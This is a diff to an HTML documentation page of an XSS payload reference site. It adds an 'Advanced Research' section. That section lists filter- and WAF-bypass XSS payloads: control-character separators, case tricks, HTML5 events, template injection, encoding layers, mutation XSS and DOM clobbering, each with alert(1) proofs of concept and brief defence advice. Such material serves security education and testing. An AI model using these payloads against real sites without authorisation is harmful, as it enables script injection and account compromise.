@@ -133,6 +133,7 @@
                             <li><a href="#waf-bypasses">WAF Bypasses</a></li>
                             <li><a href="#csp-bypasses">CSP Bypasses</a></li>
                             <li><a href="#encoding-tricks">Encoding Tricks</a></li>
+                            <li><a href="#advanced-research">Advanced Research</a></li>
                         </ul>
                     </li>
                     <li class="nav-section">
@@ -1013,6 +1014,262 @@ class XSSFuzzer:
                         </div>
                     </div>
                 </div>
+
+                <div id="advanced-research" class="subsection">
+                    <h3>🔬 Advanced Research Techniques</h3>
+                    <p>Cutting-edge XSS bypass techniques based on recent security research and analysis of modern web application defenses.</p>
+
+                    <div class="research-attribution">
+                        <div class="attribution-card">
+                            <h4>📚 Research Credits</h4>
+                            <p>This section incorporates advanced techniques from:</p>
+                            <ul class="attribution-list">
+                                <li>
+                                    <strong><a href="https://netsec.expert/posts/xss-in-2020/" target="_blank" rel="noopener">XSS in 2020</a></strong> by
+                                    <a href="https://github.com/the-xentropy" target="_blank" rel="noopener">Sam Anttila (@the-xentropy)</a>
+                                </li>
+                                <li>Research from the global security community and bug bounty programs</li>
+                                <li>Modern WAF evasion techniques discovered in 2024-2025</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="advanced-techniques">
+                        <div class="technique-card">
+                            <h4>🔤 Non-Standard Character Separators</h4>
+                            <p>Most filters expect standard whitespace (space, tab) between HTML attributes. Non-standard control characters can bypass these filters:</p>
+                            <div class="code-example">
+                                <div class="code-header">
+                                    <span>Control Character Separators</span>
+                                    <button class="copy-code" onclick="copyCode(this)">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </div>
+                                <pre><code># Form Feed (\f) as separator
+&lt;img\fsrc=x\fonerror=alert(1)&gt;
+
+# Carriage Return (\r) as separator
+&lt;img\rsrc=x\ronerror=alert(1)&gt;
+
+# Vertical Tab (\v) as separator
+&lt;img\vsrc=x\vonerror=alert(1)&gt;
+
+# Line Feed (\n) as separator
+&lt;img
+src=x
+onerror=alert(1)&gt;</code></pre>
+                            </div>
+                            <div class="technique-note">
+                                <p><strong>Why it works:</strong> Many input filters only check for spaces and tabs as attribute separators, missing other whitespace characters that browsers interpret as valid separators.</p>
+                            </div>
+                        </div>
+
+                        <div class="technique-card">
+                            <h4>📝 Case-Sensitivity Filter Bypasses</h4>
+                            <p>Many security filters implement case-sensitive blacklists that can be bypassed with creative case variations:</p>
+                            <div class="code-example">
+                                <div class="code-header">
+                                    <span>Case Variation Techniques</span>
+                                    <button class="copy-code" onclick="copyCode(this)">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </div>
+                                <pre><code># Mixed case event handlers
+&lt;img src=x OnErRoR=alert(1)&gt;
+&lt;svg ONlOaD=alert(1)&gt;
+&lt;body oNlOaD=alert(1)&gt;
+
+# Tag name case variations
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+&lt;ImG src=x onerror=alert(1)&gt;
+
+# Mixed case with attributes
+&lt;SvG onLoad=alert(1)&gt;
+&lt;VIDEO onloadstart=alert(1)&gt;</code></pre>
+                            </div>
+                            <div class="technique-note">
+                                <p><strong>Research insight:</strong> While HTML is case-insensitive, many WAF rules are case-sensitive for performance reasons. This creates a bypass opportunity discovered through systematic testing.</p>
+                            </div>
+                        </div>
+
+                        <div class="technique-card">
+                            <h4>📡 Modern HTML5 Event Handlers</h4>
+                            <p>HTML5 introduced many new event handlers that older security filters don't recognize, creating opportunities for evasion:</p>
+                            <div class="code-example">
+                                <div class="code-header">
+                                    <span>HTML5 Event Handlers</span>
+                                    <button class="copy-code" onclick="copyCode(this)">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </div>
+                                <pre><code># Media events (often missed by filters)
+&lt;video onloadstart=alert(1)&gt;
+&lt;audio oncanplay=alert(1)&gt;
+&lt;video onplay=alert(1) autoplay&gt;
+&lt;audio onended=alert(1)&gt;
+
+# Experimental events
+&lt;details onbeforetoggle=alert(1) open&gt;
+&lt;dialog oncancel=alert(1)&gt;
+
+# Form events
+&lt;input oninvalid=alert(1) required&gt;
+&lt;form oninput=alert(1)&gt;&lt;input&gt;&lt;/form&gt;</code></pre>
+                            </div>
+                            <div class="technique-note">
+                                <p><strong>Modern advantage:</strong> Security filters often maintain static lists of known event handlers. New HTML5 events and experimental features provide a constantly evolving attack surface.</p>
+                            </div>
+                        </div>
+
+                        <div class="technique-card">
+                            <h4>🏗️ Framework-Specific Injection Vectors</h4>
+                            <p>Modern web frameworks introduce unique template syntax that can be exploited for XSS when input validation is insufficient:</p>
+                            <div class="code-example">
+                                <div class="code-header">
+                                    <span>Framework Template Injections</span>
+                                    <button class="copy-code" onclick="copyCode(this)">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </div>
+                                <pre><code># AngularJS Template Injection
+{{constructor.constructor('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+
+# Vue.js Expression Injection
+{{constructor.constructor('alert(1)')()}}
+
+# React JSX Injection (in certain contexts)
+{React.createElement('img', {onError: alert(1), src: 'x'})}
+
+# Template Literal Injection
+`${alert(1)}`
+`${constructor.constructor('alert(1)')()}`</code></pre>
+                            </div>
+                            <div class="technique-note">
+                                <p><strong>Framework insight:</strong> Template engines that allow expression evaluation create powerful injection vectors that bypass traditional XSS filters focused on HTML tags and JavaScript.</p>
+                            </div>
+                        </div>
+
+                        <div class="technique-card">
+                            <h4>🔄 Double-Encoding and Layered Bypasses</h4>
+                            <p>Advanced encoding techniques that apply multiple layers of obfuscation to evade detection systems:</p>
+                            <div class="code-example">
+                                <div class="code-header">
+                                    <span>Advanced Encoding Bypasses</span>
+                                    <button class="copy-code" onclick="copyCode(this)">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </div>
+                                <pre><code># Base64 + Evaluation
+&lt;img src=x onerror=eval(atob('YWxlcnQoMSk='))&gt;
+
+# URL Encoding + JavaScript Execution
+&lt;img src=x onerror=%61%6C%65%72%74%28%31%29&gt;
+
+# HTML Entities in srcdoc
+&lt;iframe srcdoc="&amp;lt;script&amp;gt;parent.alert(1)&amp;lt;/script&amp;gt;"&gt;
+
+# Unicode + String Construction
+&lt;script&gt;eval('\u0061lert(1)')&lt;/script&gt;
+
+# Character Code Construction
+&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;</code></pre>
+                            </div>
+                            <div class="technique-note">
+                                <p><strong>Layered approach:</strong> By combining multiple encoding methods, attackers can evade filters that only decode once or check for specific patterns without full normalization.</p>
+                            </div>
+                        </div>
+
+                        <div class="technique-card">
+                            <h4>🧬 mXSS (Mutation XSS) Techniques</h4>
+                            <p>Browser parsing quirks that create XSS vulnerabilities after DOM manipulation, even when initial input appears safe:</p>
+                            <div class="code-example">
+                                <div class="code-header">
+                                    <span>mXSS Examples</span>
+                                    <button class="copy-code" onclick="copyCode(this)">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </div>
+                                <pre><code># SVG mXSS (Chrome/Safari)
+&lt;svg&gt;&lt;listing&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/listing&gt;&lt;/svg&gt;
+
+# Template element mXSS
+&lt;template&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/template&gt;
+
+# Math element mXSS
+&lt;math&gt;&lt;mtext&gt;&lt;option&gt;&lt;FAKEFAKE&gt;&lt;mglyph&gt;&lt;svg&gt;&lt;mmalignmark&gt;&lt;xss&gt;alert(1)&lt;/xss&gt;
+
+# Noscript mXSS
+&lt;noscript&gt;&lt;p title="&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;"&gt;</code></pre>
+                            </div>
+                            <div class="technique-note">
+                                <p><strong>Browser behavior:</strong> Different browsers parse and normalize HTML differently. What appears safe in one parsing context can become dangerous when moved to another DOM context.</p>
+                            </div>
+                        </div>
+
+                        <div class="technique-card">
+                            <h4>🎯 DOM Clobbering for XSS</h4>
+                            <p>Using DOM clobbering to overwrite JavaScript properties and enable XSS execution:</p>
+                            <div class="code-example">
+                                <div class="code-header">
+                                    <span>DOM Clobbering Techniques</span>
+                                    <button class="copy-code" onclick="copyCode(this)">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </div>
+                                <pre><code># Clobber window properties
+&lt;form id=x&gt;&lt;output id=y&gt;alert(1)&lt;/output&gt;&lt;/form&gt;
+&lt;script&gt;eval(x.y.value)&lt;/script&gt;
+
+# Clobber document properties
+&lt;img name=implementation id=createHTMLDocument src=x&gt;
+&lt;script&gt;document.implementation.createHTMLDocument('').write('&lt;script&gt;alert(1)&lt;/script&gt;')&lt;/script&gt;
+
+# Iframe clobbering
+&lt;iframe name=alert src=x&gt;&lt;/iframe&gt;
+&lt;script&gt;alert(1)&lt;/script&gt; // This calls the iframe instead</code></pre>
+                            </div>
+                            <div class="technique-note">
+                                <p><strong>Clobbering insight:</strong> DOM clobbering exploits the way browsers resolve property lookups, allowing HTML injection to interfere with JavaScript execution paths.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="research-methodology">
+                        <h4>🔬 Research Methodology</h4>
+                        <p>These advanced techniques demonstrate the importance of:</p>
+                        <ul class="methodology-list">
+                            <li><strong>Systematic Testing:</strong> Testing edge cases and browser-specific behaviors</li>
+                            <li><strong>Filter Analysis:</strong> Understanding how security controls work before attempting bypasses</li>
+                            <li><strong>Creative Thinking:</strong> Moving beyond standard payloads to find novel attack vectors</li>
+                            <li><strong>Framework Knowledge:</strong> Understanding modern web frameworks and their unique vulnerabilities</li>
+                            <li><strong>Browser Quirks:</strong> Exploiting differences in how browsers parse and execute code</li>
+                        </ul>
+                    </div>
+
+                    <div class="defense-recommendations">
+                        <h4>🛡️ Advanced Defense Strategies</h4>
+                        <div class="defense-grid">
+                            <div class="defense-item">
+                                <h5>Comprehensive Input Validation</h5>
+                                <p>Validate against character-by-character whitelists rather than blacklists</p>
+                            </div>
+                            <div class="defense-item">
+                                <h5>Context-Aware Output Encoding</h5>
+                                <p>Apply different encoding based on where data will be inserted in the DOM</p>
+                            </div>
+                            <div class="defense-item">
+                                <h5>Regular Security Updates</h5>
+                                <p>Keep WAF rules and security libraries updated with latest bypass techniques</p>
+                            </div>
+                            <div class="defense-item">
+                                <h5>Framework-Specific Hardening</h5>
+                                <p>Implement framework-specific security measures for template engines</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
             </section>
 
             <!-- Exploitation Section -->
@@ -1392,9 +1649,9 @@ Content-Security-Policy:
                     <div class="reference-category">
                         <h3>🔬 Research Papers</h3>
                         <ul class="reference-list">
-                            <li><a href="https://www.usenix.org/conference/usenixsecurity20/presentation/somé" target="_blank">"Same Origin Policy: Evaluation in Modern Browsers" - USENIX Security 2020</a></li>
-                            <li><a href="https://research.google/pubs/pub48021/" target="_blank">"CSP Is Dead, Long Live CSP!" - Google Research</a></li>
-                            <li><a href="https://www.ndss-symposium.org/ndss-paper/postcards-from-the-post-xss-world/" target="_blank">"Postcards from the Post-XSS World" - NDSS 2018</a></li>
+                            <li><a href="https://netsec.expert/posts/xss-in-2020/" target="_blank">"XSS in 2020" - Sam Anttila (@the-xentropy)</a> - Modern XSS bypass techniques and filter evasion</li>
+                            <li><a href="https://www.researchgate.net/publication/341155901_Cross-site_Scripting_Research_A_Review" target="_blank">"Cross-site Scripting Research: A Review.</a></li>
+                            <li><a href="https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/" target="_blank">"CSP Is Dead, Long Live CSP!" - Google Research</a></li>
                         </ul>
                     </div>
 
@@ -1448,7 +1705,7 @@ Content-Security-Policy:
             <div class="footer-content">
                 <div class="footer-section">
                     <h3>🥷 XSSNow</h3>
-                    <p>The most comprehensive XSS payload database for ethical security research and education.</p>
+                    <p>The most comprehensive XSS payload database with <span id="dynamicPayloadCount">Loading...</span> payloads for ethical security research and education.</p>
                     <div class="github-star">
                         <a href="https://github.com/dr34mhacks/xssnow" target="_blank" class="star-btn">
                             <i class="fas fa-star"></i> Leave us a star
@@ -1459,7 +1716,7 @@ Content-Security-Policy:
                 <div class="footer-section">
                     <h4>Resources</h4>
                     <ul>
-                        <li><a href="payloads.html">XSS Payloads</a></li>
+                        <li><a href="payloads.html">XSS Payloads (<span id="payloadLinkCount">Loading...</span>)</a></li>
                         <li><a href="xss-payload-generator.html">Payload Generator</a></li>
                         <li><a href="docs.html">Documentation</a></li>
                         <li><a href="contributors.html">Contributors</a></li>
@@ -1489,7 +1746,7 @@ Content-Security-Policy:
 
             <div class="footer-bottom">
                 <div class="footer-text">
-                    <p>&copy; 2026 XSSNow. Built with ❤️ by <a href="https://www.linkedin.com/in/sid-j0shi/" target="_blank" style="color: var(--neon-green); text-decoration: none;">Sid Joshi</a> (dr34mhacks)</p>
+                    <p>&copy; 2026 XSSNow. Built with ❤️ by <a href="https://github.com/dr34mhacks/" target="_blank" style="color: var(--neon-green); text-decoration: none;">Sid Joshi (dr34mhacks)</a> </p>
                     <p class="disclaimer">⚠️ For educational and ethical security testing only. Use responsibly.</p>
                 </div>
             </div>
